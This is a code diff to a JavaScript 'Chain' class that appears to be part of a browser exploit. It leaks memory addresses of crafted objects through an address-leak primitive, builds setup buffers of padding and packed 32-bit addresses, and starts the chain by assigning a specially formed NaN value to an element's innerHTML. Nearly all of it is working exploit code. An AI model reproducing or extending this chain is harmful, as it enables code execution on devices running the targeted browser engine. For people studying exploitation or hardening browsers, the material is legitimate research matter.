@@ -9,7 +9,7 @@ class Chain {
 	constructor(cb) {
 		this.cb = cb;
 		
-		this.addrChainStart = 0;
+		this.addrChainStart = null;
 	}
 	
 	///////////////////////////////////////
@@ -50,55 +50,50 @@ class Chain {
 	///////////////////////////////////////
 	
 	setup2Make(addr) {
-		return Util.pad(0x30)
+		return Util.pad(0x30, unescape("\u5332"))
 			+ Util.int32(addr);
 	}
 	
 	setup1Make(addr) {		
-		return Util.int32(addr);
+		return Util.int32(addr)
+			+ Util.pad(0x30, unescape("\u5331"));
 	}
 	
-	prepare(arrayLeaker) {
-		var i = 10;
-	
-		var addrData = arrayLeaker.setAndGetAddress(i++, this.cb.getData());
+	prepare(arrayLeaker) {	
+		var addrData = arrayLeaker.getAddress(this.cb.getData());
 		if (addrData === null) {
 			throw new Error("Failed to get chain data address.");
 		}
-		logger.debug(`Found chain data at 0x${addrData.toString(16)}`);
 		this.cb.updateDataAddress(addrData);
 		
-		var addrStack = arrayLeaker.setAndGetAddress(i++, this.cb.getChain());
+		var addrStack = arrayLeaker.getAddress(this.cb.getChain());
 		if (addrStack === null) {
 			throw new Error("Failed to get chain stack address.");
 		}
-		logger.debug(`Found chain stack at 0x${addrStack.toString(16)}`);
 		var chainStackOffset = 0x4;
 		
 		var setup2 = this.setup2Make(addrStack + chainStackOffset);
-		var addrSetup2 = arrayLeaker.setAndGetAddress(i++, setup2);
+		var addrSetup2 = arrayLeaker.getAddress(setup2);
 		if (addrSetup2 === null) {
+			logger.debug("addrStack 0x${addrStack.toString(16)}");
 			throw new Error("Failed to get setup2 address.");
 		}
-		logger.debug(`Found setup2 at 0x${addrSetup2.toString(16)}`);
 		
 		var setup1 = this.setup1Make(addrSetup2);
-		var addrSetup1 = arrayLeaker.setAndGetAddress(i++, setup1);
+		var addrSetup1 = arrayLeaker.getAddress(setup1);
 		if (addrSetup1 === null) {
+			logger.debug(`addrSetup2 0x${addrSetup2.toString(16)}`);
 			throw new Error("Failed to get setup1 address.");
 		}
-		logger.debug(`Found setup1 at 0x${addrSetup1.toString(16)}`);
 		
 		this.addrChainStart = addrSetup1;
-		logger.debug(`Chain start at 0x${this.addrChainStart.toString(16)}`);
 	}
 	
 	execute() {
-		if (this.addrChainStart === 0) {
+		if (this.addrChainStart === null) {
 			throw new Error("addrChainStart is null");
 		}
 		
-		logger.debug(`Starting chain at 0x${this.addrChainStart.toString(16)}`);
 		trigger.innerHTML = -parseFloat("NAN(ffffe" + this.addrChainStart.toString(16));
 	}
 	
